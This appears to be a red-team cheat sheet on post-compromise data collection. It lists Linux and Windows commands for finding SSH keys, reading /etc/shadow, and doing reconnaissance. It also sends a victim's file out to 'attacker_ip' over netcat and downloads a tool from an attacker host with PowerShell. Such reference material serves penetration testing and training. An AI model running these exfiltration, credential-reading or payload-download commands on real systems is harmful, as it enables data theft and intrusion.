# Collection - File System Operations & Data Manipulation

This section covers common commands and techniques for interacting with file systems and manipulating data on both Linux/Unix and Windows operating systems, crucial for data collection during red team operations.

## Linux/Unix Commands

### Find Sensitive Files

Locating sensitive files such as SSH keys, configuration files, or world-writable files can provide valuable information or opportunities for privilege escalation.

*   **Find SSH private keys:**
    ```bash
    find / -name "id_rsa" 2>/dev/null
    ```
*   **Find configuration or log files:**
    ```bash
    find / -name "*.conf" -o -name "*.log" 2>/dev/null
    ```
*   **Find world-writable files:**
    ```bash
    find / -type f -perm /0002 2>/dev/null # World-writable files
    ```

### Read Files

Reading the content of various system files can reveal sensitive information, user details, or system configurations.

*   **Read `/etc/passwd` (user accounts):**
    ```bash
    cat /etc/passwd
    ```
*   **Read `/var/log/auth.log` (authentication logs):**
    ```bash
    less /var/log/auth.log
    ```
*   **Read first 10 lines of `/etc/shadow` (hashed passwords - requires root):**
    ```bash
    head -n 10 /etc/shadow
    ```
*   **Read last 20 lines of `/var/log/syslog` (system logs):**
    ```bash
    tail -n 20 /var/log/syslog
    ```

### Write/Append to Files

Modifying or creating files can be used for persistence, data staging, or injecting malicious content.

*   **Overwrite file content:**
    ```bash
    echo "malicious content" > file.txt
    ```
*   **Append to file content:**
    ```bash
    echo "more content" >> file.txt
    ```

### Transfer Files (Netcat)

Netcat (nc) is a versatile networking utility that can be used for simple file transfers.

*   **Listener (Attacker):** Set up a listener to receive a file.
    ```bash
    nc -lvnp 1234 > received_file.txt
    ```
*   **Sender (Victim):** Send a file to the attacker.
    ```bash
    nc attacker_ip 1234 < file_to_send.txt
    ```

### Process Management

Understanding and manipulating running processes is crucial for maintaining stealth and controlling compromised systems.

*   **List processes and filter by name:**
    ```bash
    ps aux | grep <process_name>
    ```
*   **Kill a process by PID:**
    ```bash
    kill <pid>
    ```

## Windows Commands (cmd.exe / PowerShell)

### List Directory Contents

*   **List contents of a directory:**
    ```cmd
    dir C:\Users\Public
    ```

### Read File Content

*   **Read content of a text file:**
    ```cmd
    type C:\Windows\System32\drivers\etc\hosts
    ```

### Find Files

*   **Find all `.txt` files in `C:\Users` and its subdirectories:**
    ```cmd
    dir /s /b C:\Users\*.txt
    ```

### Network Configuration

*   **Display all network configuration details:**
    ```cmd
    ipconfig /all
    ```
*   **Display active network connections and listening ports:**
    ```cmd
    netstat -ano
    ```

### Firewall Rules

*   **Show all firewall rules:**
    ```cmd
    netsh advfirewall firewall show rule name=all
    ```

### Process Management

*   **List all running processes:**
    ```cmd
    tasklist
    ```
*   **Terminate a process by PID:**
    ```cmd
    taskkill /PID <pid> /F
    ```

### PowerShell Web Download

Downloading files from the internet using PowerShell is a common method for transferring tools or payloads.

*   **Download a file from a URL:**
    ```powershell
    Invoke-WebRequest -Uri http://attacker_ip/tool.exe -OutFile C:\tool.exe
    ```

These commands provide a foundation for interacting with compromised systems and collecting necessary data during red team operations.

